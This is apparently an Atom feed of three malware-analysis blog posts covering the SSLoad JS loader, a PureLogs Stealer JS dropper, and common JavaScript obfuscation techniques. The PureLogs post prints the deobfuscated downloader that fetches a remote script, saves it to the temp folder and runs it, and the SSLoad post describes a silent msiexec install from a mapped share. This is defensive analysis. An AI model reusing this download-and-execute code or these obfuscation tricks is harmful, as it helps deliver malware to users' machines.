<?xml version="1.0" encoding="utf-8"?>

<feed xmlns="http://www.w3.org/2005/Atom" >
  <generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator>
  <link href="http://localhost:4000/tag/malware/feed.xml" rel="self" type="application/atom+xml" />
  <link href="http://localhost:4000/" rel="alternate" type="text/html" />
  <updated>2024-05-08T21:14:38-06:00</updated>
  <id>http://localhost:4000/tag/malware/feed.xml</id>

  
  
  

  
    <title type="html">Hanleyjames.github.io | </title>
  

  
    <subtitle>A blog about software engineering and books</subtitle>
  

  

  
    
      
    
  

  
  

  
    <entry>
      <title type="html">SSLoad</title>
      <link href="http://localhost:4000/SSLoad" rel="alternate" type="text/html" title="SSLoad" />
      <published>2024-05-08T05:50:00-06:00</published>
      <updated>2024-05-08T05:50:00-06:00</updated>
      <id>http://localhost:4000/SSLoad</id>
      <content type="html" xml:base="http://localhost:4000/SSLoad">&lt;p&gt;MalwareBazzar: 092962bc268390debf17cd148d03147cd919e42e61c92de01eac3bdb34b1c&lt;/p&gt;

&lt;h1 id=&quot;about&quot;&gt;About&lt;/h1&gt;

&lt;p&gt;SSLoad is a recent family of malware which was originally created in rust. It gets its name from  its early C2 using &lt;a href=&quot;https://malpedia.caad.fkie.fraunhofer.de/details/win.ssload&quot;&gt;“a first-stage DLL that connected to a Telegram channel named ‘SSLoad’ to retrieve another URL. It then downloaded a compressed PE file using a hardcoded User-Agent (SSLoad/1.x) and Content-Type over HTTP”&lt;/a&gt;. If you want to read more about its broader campaing, I would also suggest checking out the article by &lt;a href=&quot;https://www.securonix.com/blog/securonix-threat-research-security-advisory-frozenshadow-attack-campaign/&quot;&gt;Den Iyzvyk, Oleg Kolesnikov &amp;amp; Tim Peck&lt;/a&gt; over the broader FROZEN#SHADOW campaign. Today I am more interested in checking out both what Den, Oleg and Tim cover, the javascript aspect of this.&lt;/p&gt;

&lt;h1 id=&quot;comment-hell&quot;&gt;Comment Hell&lt;/h1&gt;

&lt;p&gt;I opened this file and was taken back. I originally started looking at the code comment bloat. 
&lt;img src=&quot;assets/images/24-5-4-SSLoad.JPG&quot; alt=&quot;SSLoad&quot; title=&quot;SSLoad&quot; /&gt;
The first pattern I observed was for every 19 lines of commented out randomly generated words, the author either had a space or eight forwardslashes with no space after. 1177 lines later they hit our first variable declaration that calls a function. My first approach to this was just deleting every “// {word}” line. The hidden code that just relied on backticks was clear to as the point of focus. My reason being is I noticed this line “var network = new ActiveXObject…”. It did not take long to clear throught them pretty quick. This reduced the lines of code from 2k to 410. There was nothing really obscure about variable naming or anything else, so the only thing pereventing someone from understanding it was fatigue or ignorance.&lt;/p&gt;

&lt;h1 id=&quot;initial-infection&quot;&gt;Initial Infection&lt;/h1&gt;

&lt;h3 id=&quot;the-harmless-part&quot;&gt;The harmless part&lt;/h3&gt;

&lt;p&gt;Let’s get into it, so they have two sections of code. One is commented out, and the other is up front.
The non-commented code is as follows:
&lt;img src=&quot;assets/images/24-05-06-SSLoader.JPG&quot; alt=&quot;SSLoad&quot; title=&quot;SSLoad&quot; /&gt;
First they declare a variable as a function. They create an ActiveXObject for FileSystemObjects and get our scripts own name. They also create an empty string that stores content later. There’s 3 functions that are declared.&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;Function “e” checks for its own existence. It then opens itself and gets every line that has multiple forwardslashes in it. They store that in variable “d” and close the file stream.&lt;/li&gt;
  &lt;li&gt;Function “h” splits the commented out code and runs the code as a function. This gets past the other popular use of an eval statement to call code.&lt;/li&gt;
  &lt;li&gt;Function “j” is returned, which calls function “e” and “h” in a try catch block with silent error handling.
The code ends calling “j” and parsing the js file itself.&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;the-other-side-of-the-coin&quot;&gt;The other side of the coin&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;assets/images/24-05-06-SSLoader1.JPG&quot; alt=&quot;SSLoad&quot; title=&quot;SSLoad&quot; /&gt;
&lt;img src=&quot;assets/images/24-05-06-SSLoader2.JPG&quot; alt=&quot;SSLoad&quot; title=&quot;SSLoad&quot; /&gt;
The code names are a lot cleaner than a,b,c in this section. There’s an ActiveXObject for connecting to the network, and some variables to store information about connection status, attemps and drive letters for the network. Next we check if the drive is mapped with a function. From there we have a for loop that starts at the letter “z” and decrements until it is able to connect to ${letter}:\krd6 . com@80\share. We then connect to the drive using winmgmt. Last, if we’re connected to the drive we use msiexec to install the avp.msi file off of the drive quietly. We then then try to disconnect the network drive and the 2nd stage payload happens.&lt;/p&gt;

&lt;h1 id=&quot;closing-thoughts&quot;&gt;Closing Thoughts&lt;/h1&gt;

&lt;p&gt;This one was pretty funny. It was pretty quick to figure out what was going on, and dodged eval statements to essentially do the same thing. That being how do we get this to run the more important part of the the program. It was unique in that sense, as I have yet to see a sample do this in a meaningful way. The code comments themselves were more of a pain, but it made it easy to write a script that just pulled code between every 19 lines that did not start with // SIG //. From that perspective, this was a relatively quick one. All of the more malicious and permanent files are pulled off of the krd6 server in Russia. If you want more technical details about the file and what drops afterwords, check out: &lt;a href=&quot;https://www.joesandbox.com/analysis/1427450/1/html&quot;&gt;Joe Sandbox ID: 1427450&lt;/a&gt;&lt;/p&gt;</content>

      
      
      
      
      

      <author>
          <name>James Hanley</name>
        
        
      </author>

      

      
        <category term="Malware" />
      
        <category term="JS" />
      

      
        <summary type="html">MalwareBazzar: 092962bc268390debf17cd148d03147cd919e42e61c92de01eac3bdb34b1c</summary>
      

      
      
    </entry>
  
    <entry>
      <title type="html">PureLogs Stealer</title>
      <link href="http://localhost:4000/PureLogStealer" rel="alternate" type="text/html" title="PureLogs Stealer" />
      <published>2024-05-05T05:50:00-06:00</published>
      <updated>2024-05-05T05:50:00-06:00</updated>
      <id>http://localhost:4000/PureLogStealer</id>
      <content type="html" xml:base="http://localhost:4000/PureLogStealer">&lt;p&gt;MalwareBazzar: 3eaae1b3f71898ceac37bd6a7779ed9e821d06a1004ff5f527922ae6c9066082&lt;/p&gt;

&lt;h1 id=&quot;about&quot;&gt;About&lt;/h1&gt;

&lt;p&gt;&lt;a href=&quot;https://malpedia.caad.fkie.fraunhofer.de/details/win.purelogs&quot;&gt;“PureLogs, also known as PureLog Stealer, is an infostealer malware from the Pure family that aims to steal sensitive information from infected devices.”&lt;/a&gt;. My general knowledge of the Purelogs family is limited. If you’re looking for something detailed about PureLog/PureLogs/PureLogs Stealer there is a wonderful writeup on Any.Run by &lt;a href=&quot;https://any.run/cybersecurity-blog/pure-malware-family-analysis/&quot;&gt;khr0x, Jane &amp;amp; Maksim Mikhailov&lt;/a&gt;. It’s worth reading so I would recommend checking it out. I will be walking through the file listed with the hash above.
The JS file itself looks like the following:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/24-05-05-PureLogStealer-1.JPG&quot; alt=&quot;PureLogsStealer1&quot; title=&quot;PureLogs Stealer1&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;initial-overview&quot;&gt;Initial Overview&lt;/h3&gt;

&lt;p&gt;This relatively small file and at first glance, its approach seems pretty straightforward. We’re building a string with the &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/fromCharCode&quot;&gt;stactic method&lt;/a&gt; on the String object.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    String.fromCharCode(...)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This large method builds a really large string and hides the UTF-16 character codes. The author takes a number, variable U1s (258393352), and subtracts a larger number to get a set of UTF-16 character codes. In the example below we can see that the first three letters come out to be ‘t’ ‘r’ ‘y’.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/24-05-05-PureLogsStealer-2.JPG&quot; alt=&quot;PureLogsStealer2&quot; title=&quot;PureLogs Stealer2&quot; /&gt;
&lt;img src=&quot;/assets/images/24-05-05-PureLogsStealer-3.jpg&quot; alt=&quot;PureLogsStealer3&quot; title=&quot;PureLogs Stealer3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After this string is built and then stored in a variable, the author calls &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval&quot;&gt;eval()&lt;/a&gt; to build the initial JS payload.&lt;/p&gt;

&lt;h3 id=&quot;payload&quot;&gt;Payload&lt;/h3&gt;

&lt;p&gt;The following string is the actual JS that is used to drop a secondary file and .Net code eventually. I have cleaned up some variable names and censored the domain name to prevent someone from accidentally following the link.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    try{
        var Object = new ActiveXObject(&apos;MSXML2.XMLHTTP&apos;)
        Object.Open(&apos;GET&apos;,
            &apos;https://postutopia.***/wp-includes/images/smilies/wp.js&apos;,
            false             )
        Object.Send()
        var axo = new ActiveXObject(&apos;Scripting.FileSystemObject&apos;)
        var filepath = axo.GetSpecialFolder(2) + &apos;/IDWYPJ.js&apos;

        if (Object.Status == 200){
            var Stream = new ActiveXObject(&apos;ADODB.Stream&apos;)
            Stream.Open()
            Stream.Type = 1
            Stream.Write(Object.ResponseBody)
            Stream.Position = 0
            Stream.SaveToFile(filepath, 2)                 Stream.Close()
            var WshShell = new ActiveXObject(&apos;WScript.Shell&apos;)
            var oRun = WshShell.Run(filepath)             }
    } catch(e) {}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The file works by checking for the existence of this wp.js file stored. It then sends this get request and creates an ActiveXObject (axo), this is used to get the file path to the temporary directory and the file we’re creating. If the GET request is successful we write the wp.js file and save it (if it already exists we overwrite it). Last we created one more ActiveXObject to run the dropped wp.js, now named IDWYPJ.js file. This new file then drops an EXE and creates a few files in the temp directory called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;audio.exe&lt;/code&gt;, which looks to be an AsyncRAT.&lt;/p&gt;

&lt;h3 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h3&gt;

&lt;p&gt;This sample of malware was not particularly interesting in terms of JS and what it did to obscure its intent. Its primary payload was only novel in the sense that it used String.fromCharCode, but it was not so obscure, that it was hard to figure out immediately what was going on. It then delivered the main JS in this String of CharCodes that it calls eval on. To read more about the malware itself and its full lifecycle, you can &lt;a href=&quot;https://www.joesandbox.com/analysis/1430766/0/html&quot;&gt;follow that here&lt;/a&gt;. This was probably one of the easier samples I had an opportunity to mess around with.&lt;/p&gt;</content>

      
      
      
      
      

      <author>
          <name>James Hanley</name>
        
        
      </author>

      

      
        <category term="Malware" />
      
        <category term="JS" />
      

      
        <summary type="html">MalwareBazzar: 3eaae1b3f71898ceac37bd6a7779ed9e821d06a1004ff5f527922ae6c9066082</summary>
      

      
      
    </entry>
  
    <entry>
      <title type="html">JS Malware Obsfucation</title>
      <link href="http://localhost:4000/js-malware-obsfucation" rel="alternate" type="text/html" title="JS Malware Obsfucation" />
      <published>2024-05-04T05:00:00-06:00</published>
      <updated>2024-05-04T05:00:00-06:00</updated>
      <id>http://localhost:4000/js-malware-obsfucation</id>
      <content type="html" xml:base="http://localhost:4000/js-malware-obsfucation">&lt;h2 id=&quot;obfuscation&quot;&gt;Obfuscation&lt;/h2&gt;
&lt;p&gt;An integral part of malware development or at least trying to figure it out centers around a practice called &lt;a href=&quot;https://en.wikipedia.org/wiki/Obfuscation_(software)&quot;&gt;Obfuscation&lt;/a&gt;. Obfuscation is &lt;a href=&quot;https://en.wiktionary.org/wiki/obfuscation#English&quot;&gt;‘[t]he alteration of computer code to preserve its behavior while concealing its structure and intent’.&lt;/a&gt;. Deobfuscation is the process of turning unreadable, or comically obscure code into something readable. To me, the practice of doing it in Javascript is interesting because it seems like the last language you would want to use if you’re developing malware. Out of this line of thinking, I wanted to spend time exploring how JS malware operates and how people use JS to infect machines.&lt;/p&gt;

&lt;h3 id=&quot;how-are-js-viruses-launched&quot;&gt;How are JS Viruses launched?&lt;/h3&gt;
&lt;p&gt;Primarily JS Malware uses &lt;a href=&quot;https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc738350(v=ws.10)&quot;&gt;Windows Script Host/WSH&lt;/a&gt; to do the majority of the work. Most people who write these viruses are not using NodeJS itself to do anything. WSH launches a Javascript file and then depending on the use, they either use WSH to write files or &lt;a href=&quot;https://learn.microsoft.com/en-us/previous-versions/windows/desktop/automat/activex-objects&quot;&gt;ActiveXObjects&lt;/a&gt; to write files. I am open to being proven wrong, but at the moment I cannot find one that targets Unix systems as a single JS file itself. With this in mind, we can move on to what I think is the more interesting part of this conversation. What techniques are commonly used to make these files unreadable&lt;/p&gt;

&lt;h2 id=&quot;how-do-malware-authors-mask-intent-or-structure&quot;&gt;How do malware authors mask intent or structure?&lt;/h2&gt;

&lt;h3 id=&quot;hex-and-unicode&quot;&gt;Hex and Unicode&lt;/h3&gt;

&lt;p&gt;Any set of characters in Hex or Unicode is supported by the &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Lexical_grammar&quot;&gt;lexical grammar&lt;/a&gt; rules that JS interprets. This has legitimate and ambiguous uses but I would suggest following the lexical grammar link posted earlier. A clear example of how I have seen this used in the wild is:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    String[&apos;\u0070\u0072\u006f\u0074\u006f\u0074\u0079\u0070\u0065&apos;].test = function(){
        console.log(&apos;test&apos;);
    }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This creates a prototype function called test, which under the hood is interpreted as:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    String[&apos;prototype&apos;].test = function(){
        console.log(&apos;test&apos;);
    }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I have also seen this used to hide commands used by WSH or ActiveXObjects.&lt;/p&gt;

&lt;h3 id=&quot;eval&quot;&gt;Eval&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval&quot;&gt;Eval&lt;/a&gt; is kind of a fun, nasty, and slow way of hiding code. This often uses hex, unicode, base64 decoded strings, or charCodes to hide a payload. We can take a quick look at eval to see how it works. Let’s say I have a string that is a complete block of JS Code. I can run it as the following:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    eval(&quot;let murr = 1200; console.log(murr);&quot;);
    1200
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We have this eval statement that reads a variable called murr and logs it to the console. We then get an output of 1200. Simple enough. How this is used in the wild, is it’s often used to do more dirty work. Any time you see an eval statement, you should have some yellow-to-red flag go up in your head.&lt;/p&gt;

&lt;h3 id=&quot;function-and-variable-bloating&quot;&gt;Function and Variable bloating&lt;/h3&gt;

&lt;p&gt;This is relatively straightforward. Let’s assume I create a ton of variables, that call other variables that do nothing in any meaningful way. You would rightfully assume I am a prick if you had to clean up my mess. This is not unknown to developers in any case. It’s not indicative of malware but poor practices. Now let us also assume I do this with functions as well. I declare them with awful names and then write functions that call functions that might or might not do something useful. This is a layer of fatigue that makes it difficult to clean up. If I saw all of the following in a file, I would assume that the author of this file is trying to do something sneaky.
&lt;img src=&quot;/assets/images/24-5-4-CryptoDrainer.JPG&quot; alt=&quot;CryptoDrainer&quot; title=&quot;CryptoDrainer&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;comment-bloating&quot;&gt;Comment bloating&lt;/h3&gt;

&lt;p&gt;This also is pretty upfront. I have looked at Wikiloader, SSloader, and a few other samples, and they will bloat the code with a lot of comments. These are often just words to fill space or sometimes contain more code to obfuscate the payload further.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/24-5-4-wikiloader.JPG&quot; alt=&quot;Wikiloader&quot; title=&quot;Wikiloader&quot; /&gt;
&lt;img src=&quot;/assets/images/24-5-4-SSLoad.JPG&quot; alt=&quot;SSload&quot; title=&quot;SSLoad&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;closing-thoughts&quot;&gt;Closing thoughts&lt;/h2&gt;

&lt;p&gt;There are probably other ways that we can think of how code can be made hard to read. I am not assuming that this short post is a universal truth making it a pain in the ass to understand. I do think that this is a generally good rule for what to expect if you choose to do this in your free time. How these are implemented is more interesting than at face value, and that is what I am trying to move towards. Hopefully, this builds an interest in you, the reader, as much as it does me.&lt;/p&gt;</content>

      
      
      
      
      

      <author>
          <name>James Hanley</name>
        
        
      </author>

      

      
        <category term="Malware" />
      
        <category term="JS" />
      

      
        <summary type="html">Obfuscation An integral part of malware development or at least trying to figure it out centers around a practice called Obfuscation. Obfuscation is ‘[t]he alteration of computer code to preserve its behavior while concealing its structure and intent’.. Deobfuscation is the process of turning unreadable, or comically obscure code into something readable. To me, the practice of doing it in Javascript is interesting because it seems like the last language you would want to use if you’re developing malware. Out of this line of thinking, I wanted to spend time exploring how JS malware operates and how people use JS to infect machines.</summary>
      

      
      
    </entry>
  
</feed>
